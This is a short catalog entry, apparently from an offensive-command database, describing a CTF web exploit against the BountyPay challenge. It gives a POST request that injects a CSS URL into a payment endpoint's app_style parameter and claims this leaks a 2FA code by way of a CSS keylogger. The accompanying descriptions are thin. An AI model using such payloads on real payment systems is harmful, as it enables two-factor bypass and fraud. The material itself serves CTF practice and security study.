---
data: |-
  POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
  app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
tags:
  - ssrf
  - payment
type: command
output: 'Triggers 2FA with CSS load, leaking code via keylogger'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:05.933Z'
id: af3b4ee3-d412-4210-9ef5-28b6732f91c7
verified: false
validated: true
submitted: true
---
# post-payment-ssrf

## Command

```bash
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

## Description

Initiates payment with SSRF payload in app_style.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| app_style | CSS URL | Yes |

## Examples

HTTP POST with param.

## Expected Output

SSRF triggered.

## Related

- SSRF exploits
